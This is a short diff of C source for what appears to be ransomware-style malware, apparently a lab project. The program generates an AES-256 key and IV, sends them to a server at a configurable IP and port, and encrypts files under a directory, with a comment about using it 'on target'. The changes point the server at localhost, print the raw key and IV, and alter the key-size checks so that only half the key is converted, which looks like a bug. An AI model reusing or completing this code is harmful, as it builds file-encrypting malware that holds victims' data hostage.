@@ -16,7 +16,7 @@
 #define SIZEKEY AES_256_KEY_SIZE
 #define SIZEIV AES_BLOCK_SIZE
 
-#define SERVER_IP "192.168.0.43"
+#define SERVER_IP "127.0.0.1"
 #define PORT 8080
 #define SA struct sockaddr
 
@@ -113,8 +113,10 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
     bytes_to_hexa(iv, pIv, sizeIv);
 
     // Print for test (to delete before use on target)
-    printf("Key %s\n",pKey);
-    printf("Iv %s\n",pIv);
+    printf("pKey: %s\n",pKey);
+    printf("Key: %s\n",key);
+    printf("pIv: %s\n",pIv);
+    printf("iv: %s\n",iv);
 
     return 0;
 }
@@ -234,19 +236,19 @@ int main (int argc, char * argv[])
             }
             else {
                 // size verification
-                if (strlen(argv[4]) == SIZEKEY*2){
-                    hexa_to_bytes(pKey, key, SIZEKEY);
+                if (strlen(argv[4]) == SIZEKEY){
+                    hexa_to_bytes(pKey, key, SIZEKEY/2);
                 }
                 else {
-                    printf("Wrong key size");
+                    printf("Wrong key size\n");
                     return 0;
                 }
 
-                if (strlen(argv[5]) == SIZEIV*2){
-                    hexa_to_bytes(pIv, iv, SIZEIV);
+                if (strlen(argv[5]) == SIZEIV){
+                    hexa_to_bytes(pIv, iv, SIZEIV/2);
                 }
                 else {
-                    printf("Wrong iv size");
+                    printf("Wrong iv size\n");
                     return 0;
                 }
                 listdir(argv[2],iv,key,1);
@@ -258,7 +260,7 @@ int main (int argc, char * argv[])
             return 0;
         }
         else {
-            printf("Wrong argument");
+            printf("Wrong argument\n");
             return 0;
         }
     }
